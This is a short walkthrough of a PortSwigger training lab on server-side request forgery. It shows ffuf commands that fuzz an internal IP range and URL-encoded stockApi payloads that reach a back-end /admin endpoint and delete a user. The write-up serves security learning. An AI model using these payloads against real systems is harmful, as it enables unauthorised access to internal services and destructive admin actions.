# URL
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
# Concept
* using SSRF to contact other back-end servers
# Method of solve
* put the lab landing page inside the Burp Suite browser
* go to any product page and use the `Check Stock` button
* look at the POST request in the Burp Suite HTTP history
* we need to fuzz the IP range with the SSRF vulnerability
* send the legit POST request to the Repeater tool
* edit the POST body so that we're accessing the `/admin` endpoint
* after it replies without errors, copy the request to a file, for example `ssrf_lab.txt`
* we need to make a list of numbers to fuzz for the IP address:
```
seq 1 255 > range.txt
```
* edit the `ssrf_lab.txt` file and replace the number 1 in the IP address with `FUZZ`
* use `ffuf` to fuzz the endpoint and get a legitimate IP that is on the same range:
```
ffuf -request ssrf_lab.txt -w range.txt -mc all -fc 500
```
* whatever IP number we discover in addition is the IP address we want to abuse
* go back to the Burp Suite Repeater attack request and replace the body with the following:
```
stockApi=http%3A%2F%2F192.168.0.52%3A8080%2Fadmin%3FproductId%3D6%26storeId%3D1
```
* in this case, replace the 52 in the IP address with the number that you find
* this confirms that we can access the `/admin` endpoint on the other IP address
* use this POST body content to delete the `carlos` user and solve the challenge
```
stockApi=http%3A%2F%2F192.168.0.52%3A8080%2Fadmin/delete%3FproductId%3D6%26storeId%3D1%26username=carlos
```
